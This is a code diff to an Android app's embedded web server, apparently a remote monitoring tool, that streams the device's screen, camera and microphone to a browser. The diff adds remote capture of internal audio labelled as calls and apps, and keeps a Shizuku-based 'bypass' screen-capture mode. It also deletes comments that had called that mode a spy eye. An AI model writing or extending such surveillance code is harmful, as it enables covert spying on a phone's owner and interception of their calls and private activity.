@@ -1,5 +1,6 @@
 package com.example.detectcamera;
 
+import android.media.projection.MediaProjection;
 import android.util.Base64;
 import fi.iki.elonen.NanoHTTPD;
 import java.io.ByteArrayInputStream;
@@ -19,7 +20,6 @@ public class WebServer extends NanoHTTPD {
     private CameraService cameraService;
     private final AudioStreamManager audioStreamManager = new AudioStreamManager();
 
-    // Modos: 0 = Apagado, 1 = Normal (MediaProjection), 2 = Bypass (Shell/Shizuku)
     private int modoCapturaPantalla = 0;
     private Thread threadCapturaShell = null;
 
@@ -62,24 +62,20 @@ public class WebServer extends NanoHTTPD {
         audioStreamManager.detenerCaptura();
     }
 
-    // Cambiar de modo en vivo sin cortar la conexión del navegador
     public synchronized void cambiarModoPantalla(int nuevoModo) {
         this.modoCapturaPantalla = nuevoModo;
 
         if (nuevoModo == 2) {
-            // Apagamos MediaProjection y encendemos el ojo espía de Shizuku
             if (cameraService != null) {
                 cameraService.detenerProyeccionPantalla();
             }
             iniciarHiloShell();
         } else if (nuevoModo == 1) {
-            // Apagamos el ojo espía y volvemos al modo normal rápido
             detenerHiloShell();
             if (cameraService != null) {
                 cameraService.activarCapturaPantalla();
             }
         } else {
-            // Apagamos todo
             detenerHiloShell();
             if (cameraService != null) {
                 cameraService.detenerProyeccionPantalla();
@@ -97,7 +93,7 @@ public class WebServer extends NanoHTTPD {
                     actualizarFramePantalla(frameJpeg);
                 }
                 try {
-                    Thread.sleep(60); // Tomar fotos cada 60 milisegundos para no ahogar el procesador
+                    Thread.sleep(60);
                 } catch (InterruptedException e) {
                     Thread.currentThread().interrupt();
                     break;
@@ -253,7 +249,13 @@ public class WebServer extends NanoHTTPD {
         }
 
         if ("/audio.wav".equals(uri)) {
-            InputStream audioStream = audioStreamManager.crearAudioStreamCliente();
+            String modeParam = session.getParms().get("mode");
+            int modo = 1;
+            if ("2".equals(modeParam)) modo = 2;
+
+            MediaProjection projection = (cameraService != null) ? cameraService.getMediaProjection() : null;
+            InputStream audioStream = audioStreamManager.iniciarCaptura(modo, projection);
+
             if (audioStream != null) {
                 return newChunkedResponse(Response.Status.OK, "audio/wav", audioStream);
             }
@@ -270,16 +272,14 @@ public class WebServer extends NanoHTTPD {
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\":\"ok\"}");
         }
 
-        // Endpoint para cambiar de modo de pantalla desde los botones web
         if ("/api/screen".equals(uri)) {
             String action = session.getParms().get("action");
-            if ("start".equals(action)) cambiarModoPantalla(1);       // Modo Normal
-            else if ("bypass".equals(action)) cambiarModoPantalla(2); // Modo Bypass Shizuku
-            else if ("stop".equals(action)) cambiarModoPantalla(0);   // Detener
+            if ("start".equals(action)) cambiarModoPantalla(1);
+            else if ("bypass".equals(action)) cambiarModoPantalla(2);
+            else if ("stop".equals(action)) cambiarModoPantalla(0);
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\":\"ok\", \"modo\":" + modoCapturaPantalla + "}");
         }
 
-        // --- DISEÑO DE LA PÁGINA WEB ---
         String html = "<!DOCTYPE html>"
                 + "<html>"
                 + "<head>"
@@ -303,7 +303,7 @@ public class WebServer extends NanoHTTPD {
                 + ".btn-off { background-color: #FF1744; }"
                 + ".btn-toggle { background-color: #29B6F6; color: #000; }"
                 + ".btn-tool { background-color: #424242; color: #fff; }"
-                + ".btn-audio { background-color: #AA00FF; color: #fff; width: 100%; padding: 10px; font-size: 14px; margin-top: 10px; }"
+                + ".btn-audio { background-color: #AA00FF; color: #fff; width: 100%; padding: 10px; font-size: 13px; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; }"
                 + "</style>"
                 + "</head>"
                 + "<body>"
@@ -348,21 +348,23 @@ public class WebServer extends NanoHTTPD {
                 + "  </div>"
                 + "</div>"
 
-                // AUDIO
-                + "<div class='card' style='height: auto; min-height: 180px;'>"
+                // AUDIO MULTI-FUENTE
+                + "<div class='card' style='height: auto; min-height: 200px;'>"
                 + "  <div class='card-header'>"
-                + "    <h3>Audio en Vivo</h3>"
+                + "    <h3>Monitoreo de Audio</h3>"
                 + "  </div>"
-                + "  <p style='font-size: 13px; color: #ccc; margin: 5px 0;'>Micrófono en tiempo real.</p>"
-                + "  <button id='audioBtn' class='btn-audio' onclick='toggleAudio()'>▶ Escuchar Micrófono</button>"
+                + "  <p style='font-size: 12px; color: #ccc; margin: 5px 0;'>Selecciona la fuente de sonido a escuchar:</p>"
+                + "  <div style='display: flex; flex-direction: column; gap: 8px; margin-top: 8px;'>"
+                + "    <button id='btnMic' class='btn-audio' style='background-color: #AA00FF;' onclick='toggleAudio(1)'>🎙️ Escuchar Micrófono Ambiental</button>"
+                + "    <button id='btnInternal' class='btn-audio' style='background-color: #29B6F6; color: #000;' onclick='toggleAudio(2)'>🔊 Escuchar Audio Interno (Llamadas / Apps)</button>"
+                + "  </div>"
                 + "</div>"
 
                 + "</div>"
 
                 + "<script>"
                 + "  var rotaciones = { 'screenImg': 0, 'cameraImg': 0 };"
-                + "  var audioBtn = document.getElementById('audioBtn');"
-                + "  var listening = false;"
+                + "  var listeningMode = 0;"
                 + "  var audioCtx = null;"
                 + "  var controller = null;"
 
@@ -380,46 +382,86 @@ public class WebServer extends NanoHTTPD {
                 + "    }"
                 + "  }"
 
-                + "  async function toggleAudio() {"
-                + "    if (!listening) {"
-                + "      listening = true;"
-                + "      audioBtn.innerText = '⏹ Detener Audio';"
-                + "      audioBtn.style.backgroundColor = '#FF1744';"
-                + "      audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 48000 });"
-                + "      controller = new AbortController();"
-                + "      try {"
-                + "        const response = await fetch('/audio.wav?' + Date.now(), { signal: controller.signal });"
-                + "        const reader = response.body.getReader();"
-                + "        let nextTime = 0, headerSkipped = false;"
-                + "        while (listening) {"
-                + "          const { done, value } = await reader.read();"
-                + "          if (done) break;"
-                + "          let rawBytes = value;"
-                + "          if (!headerSkipped) {"
-                + "            if (rawBytes.length > 44) { rawBytes = rawBytes.slice(44); headerSkipped = true; } else continue;"
-                + "          }"
-                + "          let pcm16 = new Int16Array(rawBytes.buffer, rawBytes.byteOffset, Math.floor(rawBytes.byteLength / 2));"
-                + "          if (pcm16.length === 0) continue;"
-                + "          let float32 = new Float32Array(pcm16.length);"
-                + "          for (let i = 0; i < pcm16.length; i++) float32[i] = pcm16[i] / 32768.0;"
-                + "          let audioBuffer = audioCtx.createBuffer(1, float32.length, 48000);"
-                + "          audioBuffer.getChannelData(0).set(float32);"
-                + "          let source = audioCtx.createBufferSource();"
-                + "          source.buffer = audioBuffer;"
-                + "          source.connect(audioCtx.destination);"
-                + "          let currentTime = audioCtx.currentTime;"
-                + "          if (nextTime < currentTime) nextTime = currentTime;"
-                + "          source.start(nextTime);"
-                + "          nextTime += audioBuffer.duration;"
-                + "        }"
-                + "      } catch (err) {}"
-                + "    } else {"
-                + "      listening = false;"
-                + "      if (controller) controller.abort();"
-                + "      if (audioCtx) audioCtx.close();"
-                + "      audioBtn.innerText = '▶ Escuchar Micrófono';"
-                + "      audioBtn.style.backgroundColor = '#AA00FF';"
+                + "  async function toggleAudio(modoDeseado) {"
+                + "    if (listeningMode === modoDeseado) {"
+                + "      detenerAudioWeb();"
+                + "      return;"
                 + "    }"
+                + "    detenerAudioWeb();"
+
+                + "    listeningMode = modoDeseado;"
+                + "    audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });"
+                + "    controller = new AbortController();"
+
+                + "    var btnMic = document.getElementById('btnMic');"
+                + "    var btnInternal = document.getElementById('btnInternal');"
+
+                + "    if (modoDeseado === 1) {"
+                + "      btnMic.innerText = '⏹ Detener Micrófono';"
+                + "      btnMic.style.backgroundColor = '#FF1744';"
+                + "    } else {"
+                + "      btnInternal.innerText = '⏹ Detener Audio Interno';"
+                + "      btnInternal.style.backgroundColor = '#FF1744';"
+                + "      btnInternal.style.color = '#fff';"
+                + "    }"
+
+                + "    try {"
+                + "      const response = await fetch('/audio.wav?mode=' + modoDeseado + '&t=' + Date.now(), { signal: controller.signal });"
+                + "      const reader = response.body.getReader();"
+                + "      let nextTime = 0;"
+                + "      let headerSkipped = false;"
+
+                + "      while (listeningMode !== 0) {"
+                + "        const { done, value } = await reader.read();"
+                + "        if (done) break;"
+
+                + "        let rawBytes = value;"
+                + "        if (!headerSkipped) {"
+                + "          if (rawBytes.length > 44) {"
+                + "            rawBytes = rawBytes.slice(44);"
+                + "            headerSkipped = true;"
+                + "          } else continue;"
+                + "        }"
+
+                + "        let pcm16 = new Int16Array(rawBytes.buffer, rawBytes.byteOffset, Math.floor(rawBytes.byteLength / 2));"
+                + "        if (pcm16.length === 0) continue;"
+
+                + "        let float32 = new Float32Array(pcm16.length);"
+                + "        for (let i = 0; i < pcm16.length; i++) {"
+                + "          float32[i] = pcm16[i] / 32768.0;"
+                + "        }"
+
+                + "        let audioBuffer = audioCtx.createBuffer(1, float32.length, 44100);"
+                + "        audioBuffer.getChannelData(0).set(float32);"
+
+                + "        let source = audioCtx.createBufferSource();"
+                + "        source.buffer = audioBuffer;"
+                + "        source.connect(audioCtx.destination);"
+
+                + "        let currentTime = audioCtx.currentTime;"
+                + "        if (nextTime < currentTime) nextTime = currentTime;"
+                + "        source.start(nextTime);"
+                + "        nextTime += audioBuffer.duration;"
+                + "      }"
+                + "    } catch (err) {"
+                + "      if (err.name !== 'AbortError') console.error('Audio error:', err);"
+                + "    }"
+                + "  }"
+
+                + "  function detenerAudioWeb() {"
+                + "    listeningMode = 0;"
+                + "    if (controller) controller.abort();"
+                + "    if (audioCtx) audioCtx.close();"
+
+                + "    var btnMic = document.getElementById('btnMic');"
+                + "    var btnInternal = document.getElementById('btnInternal');"
+
+                + "    btnMic.innerText = '🎙️ Escuchar Micrófono Ambiental';"
+                + "    btnMic.style.backgroundColor = '#AA00FF';"
+
+                + "    btnInternal.innerText = '🔊 Escuchar Audio Interno (Llamadas / Apps)';"
+                + "    btnInternal.style.backgroundColor = '#29B6F6';"
+                + "    btnInternal.style.color = '#000';"
                 + "  }"
                 + "</script>"
                 + "</body>"
